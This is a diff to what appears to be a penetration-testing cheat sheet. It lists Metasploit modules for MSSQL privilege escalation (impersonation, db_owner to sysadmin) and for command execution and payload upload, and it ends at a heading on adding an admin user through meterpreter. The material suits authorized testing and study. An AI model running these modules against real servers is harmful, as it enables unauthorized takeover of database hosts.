@@ -279,22 +279,34 @@ Privesc
 > ```sh
 > msf> use exploit/windows/mssql/mssql_linkcrawler
 > ```
+>
+> Elevate privileges if the user has
+[[Privileges#SeImpersonatePrivilege|SeImpersonatePrivilege]]
+>
 > ```sh
-> msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
+> msf> use admin/mssql/mssql_escalate_execute_as
 > ```
+>
+> Escalate from `db_owner` to `sysadmin`
+>
 > ```sh
-> msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
+> msf> use admin/mssql/mssql_escalate_dbowner
 > ```
 
 Code execution
 
 > [!example]-
 >
+> Execute commands
+>
 > ```sh
-> msf> use admin/mssql/mssql_exec #Execute commands
+> msf> use admin/mssql/mssql_exec
 > ```
+>
+> Uploads and execute a payload
+>
 > ```sh
-> msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
+> msf> use exploit/windows/mssql/mssql_payload
 > ```
 
 Add new admin user from meterpreter session
